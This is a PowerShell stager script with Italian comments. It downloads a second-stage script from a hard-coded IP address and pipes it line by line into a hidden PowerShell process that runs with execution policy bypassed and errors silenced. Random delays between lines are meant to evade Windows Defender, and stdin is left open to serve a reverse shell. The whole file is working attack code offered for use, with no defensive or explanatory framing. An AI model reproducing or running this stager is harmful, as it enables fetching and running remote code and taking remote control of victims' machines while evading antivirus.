# Stager powershell utilizzato per attivare il second stage (altro script powershell) su macchina windows. Se il secondo stage è stato testato attivandolo direttamente da riga di comando con windows defender attivo e ha funzionato, allora con questo stager il second stage funzionerà ancora.

# URL to second stage
$url = "http://192.168.1.1/second.txt"
$scriptString = (New-Object Net.WebClient).DownloadString($url)
$scriptLines = $scriptString -split "`r?`n"

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass"
$psi.UseShellExecute = $false
$psi.RedirectStandardInput = $true
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true
$psi.CreateNoWindow = $true

$process = [System.Diagnostics.Process]::Start($psi)
Start-Sleep -Seconds 1.2

# 1. INIT error handling
$process.StandardInput.WriteLine('$ErrorActionPreference = "SilentlyContinue"')
$process.StandardInput.Flush()
Start-Sleep -Milliseconds 200

# 2. INVIO script line-by-line
foreach ($line in $scriptLines) {
    if ($line.Trim()) {
        $process.StandardInput.WriteLine($line.TrimEnd())
        $process.StandardInput.Flush()
        Start-Sleep -Milliseconds (50..150 | Get-Random)
    }
}

# 🔥 CRITICO: TRIGGER FINALE - ESEGUE tutto!
$process.StandardInput.WriteLine('')  # Nuova riga
$process.StandardInput.Flush()
Start-Sleep -Milliseconds 500

# NON chiudere stdin - reverse shell deve leggere comandi
